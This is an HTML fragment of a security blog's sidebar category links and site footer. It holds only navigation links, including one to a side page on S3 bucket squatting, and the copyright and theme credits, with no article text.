Development</a></li><li><a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a></li><li><a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a></li><li><a href=https://parsiya.net/categories/winappdbg/ title="WinAppDbg (use Frida instead)">WinAppDbg (use Frida instead)</a></li><li><a href=https://awsome.pw title='AWSome.pw - S3 bucket squatting - my very "legit" branded vulnerability'>AWSome.pw - S3 bucket squatting - my very "legit" branded vulnerability</a></li></section></aside></div></div><footer role=contentinfo><p>Copyright &copy; 2026 Parsia - <a href=https://parsiya.net/license/>License</a> -
 <span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.</p></footer></body></html>
